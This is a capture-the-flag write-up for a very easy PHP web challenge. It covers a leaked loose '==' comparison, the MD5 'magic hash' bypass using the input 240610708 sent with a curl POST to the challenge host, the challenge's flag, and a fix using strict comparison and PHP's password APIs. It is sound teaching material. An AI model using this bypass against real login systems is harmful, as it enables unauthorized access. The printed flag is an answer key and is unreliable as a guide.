# Hashkent

## Flag

```text
ONECTF{34sy_m4g1c_h4sh3s_m1l3s_sm1l3s_@ga1n}
```

## Challenge

Category: Web  
Difficulty: Very easy  
URL:

```text
http://task.ctf.uz:11003/
```

The page is a simple login form asking for a secret key.

## Recon

Requesting the page shows normal HTML, but the JavaScript console contains a
debug leak:

```js
console.log('PHP:Line-54: "0e4620974319065090195<ABUBULABUBU>" == md5($password)');
```

After submitting a password, the page also logs the actual comparison:

```js
console.log('PHP:Line-54: "0e4620974319065090195<ABUBULABUBU>" == "...user md5..."');
```

This reveals that the backend is doing a PHP loose comparison with `==`:

```php
"0e4620974319065090195..." == md5($password)
```

## Vulnerability

This is a PHP magic hash bug.

In PHP, when two strings are compared with `==`, PHP may convert strings that
look like numbers into numeric values before comparing them.

Strings like these are interpreted as scientific notation:

```text
0e12345
0e999999
0e462097431906509019562988736854
```

All of them become numeric zero:

```text
0 * 10^12345 = 0
```

So if the stored hash starts with `0e` followed only by digits, any other MD5
hash with the same `0e` plus digits format will compare equal under PHP `==`.

## Exploit

A known MD5 magic-hash input is:

```text
240610708
```

Its MD5 hash is:

```text
0e462097431906509019562988736854
```

That matches the leaked prefix and also satisfies the loose comparison.

Submit it with `curl`:

```bash
curl -i -X POST http://task.ctf.uz:11003/ -d password=240610708
```

The response contains:

```html
<span class='flag'>ONECTF{34sy_m4g1c_h4sh3s_m1l3s_sm1l3s_@ga1n}</span>
```

## Why It Works

The application should compare hashes strictly:

```php
md5($password) === $stored_hash
```

Instead, it compares with `==`, so PHP treats both hashes as numbers. Since both
look like `0e...`, both evaluate to `0`, and the login succeeds.

## Fix

Use strict comparison and avoid raw MD5 for password authentication:

```php
hash_equals($stored_hash, md5($password))
```

For real passwords, use PHP's password APIs instead:

```php
password_hash($password, PASSWORD_DEFAULT);
password_verify($password, $hash);
```
